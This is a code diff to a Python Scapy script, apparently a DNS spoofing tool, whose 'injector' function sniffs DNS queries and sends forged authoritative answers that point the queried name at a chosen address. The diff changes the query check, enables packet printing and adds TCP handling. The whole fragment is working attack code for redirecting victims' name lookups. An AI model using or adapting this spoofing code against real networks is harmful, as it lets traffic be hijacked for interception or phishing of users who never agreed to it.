@@ -31,8 +31,8 @@ def injector(pkt):
 	#pkt.show()
 	redirect_to=""
 	#print '--------------------------------has IP----------------------------------------'
-	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].aa == 0:
-		#pkt.show()
+	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+		pkt.show()
 		#print '--------------------------------has IP----------------------------------------'
 	#if((pkt[IP].src in expression) or (expression == "")): 
 		#if pkt.haslayer(DNSQR): # DNS question record
@@ -54,11 +54,13 @@ def injector(pkt):
 				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
 				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
 				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
-		else:
+		elif pkt.haslayer(TCP):
 			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
 				      UDP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)/\
 				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
 				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+		else:
+			return
 		#print 'spoofed'
 		send(spoofed_pkt)
 		#print 'Sent:', spoofed_pkt.summary()
